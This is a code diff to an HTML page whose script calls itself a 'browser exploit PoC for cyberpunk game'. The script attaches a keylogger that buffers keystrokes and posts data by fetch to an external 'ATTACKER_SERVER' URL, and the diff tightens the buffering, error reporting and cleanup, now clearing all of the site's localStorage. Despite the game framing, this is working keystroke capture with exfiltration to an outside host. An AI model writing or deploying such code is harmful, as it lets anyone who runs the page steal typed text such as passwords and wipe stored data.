@@ -35,11 +35,12 @@
 
     <script>
         // SHADOWGRID: Browser exploit PoC for cyberpunk game
-        const ATTACKER_SERVER = 'https://browserhacks.onrender.com/';
+        const ATTACKER_SERVER = 'https://browserhacks.onrender.com/log';
         const STORAGE_KEY = 'shadowgrid_exploit';
         let exploitActive = true;
         let keyloggerActive = false; // Prevent duplicate keylogger attachment
         let keyBuffer = ''; // Buffer for keystrokes
+        const MAX_BUFFER_SIZE = 1000; // Limit buffer to 1KB
         const listeners = {}; // Store listener functions for cleanup
 
         // Log exploits to UI and server
@@ -54,10 +55,10 @@
                     headers: { 'Content-Type': 'text/plain' },
                     body: message
                 }).then(response => {
-                    if (!response.ok) throw new Error('Server error');
+                    if (!response.ok) throw new Error(`Server error: ${response.status}`);
                     logDiv.innerHTML += `<p style="color: #0ff">[${new Date().toISOString()}] Data sent to SHADOWGRID server.</p>`;
                 }).catch(err => {
-                    logDiv.innerHTML += `<p style="color: #ff0">[${new Date().toISOString()}] Server offline: Data stored locally by SHADOWGRID.</p>`;
+                    logDiv.innerHTML += `<p style="color: #ff0">[${new Date().toISOString()}] Server unreachable: ${err.message.includes('404') ? '404 Not Found' : 'Connection failed'}.</p>`;
                     logDiv.scrollTop = logDiv.scrollHeight;
                 });
             }
@@ -75,7 +76,15 @@
                 if (controlKeys.includes(key) || key.length > 1) return;
                 // Buffer printable characters
                 if (key === ' ' || /[a-zA-Z0-9.,!?]/.test(key)) {
-                    keyBuffer += key;
+                    try {
+                        keyBuffer += key;
+                        // Truncate buffer if exceeding max size
+                        if (keyBuffer.length > MAX_BUFFER_SIZE) {
+                            keyBuffer = keyBuffer.slice(-MAX_BUFFER_SIZE);
+                        }
+                    } catch (err) {
+                        logExploit(`Keylogger error: Storage quota exceeded (${err.message}).`);
+                    }
                 }
             };
             document.addEventListener('keydown', listeners.keylogger, { once: false, capture: false });
@@ -209,7 +218,7 @@
             exploitActive = false;
             keyloggerActive = false;
             keyBuffer = ''; // Clear key buffer
-            localStorage.removeItem(STORAGE_KEY);
+            localStorage.clear(); // Clear all localStorage
             // Remove event listeners
             if (listeners.keylogger) {
                 document.removeEventListener('keydown', listeners.keylogger, { capture: false });
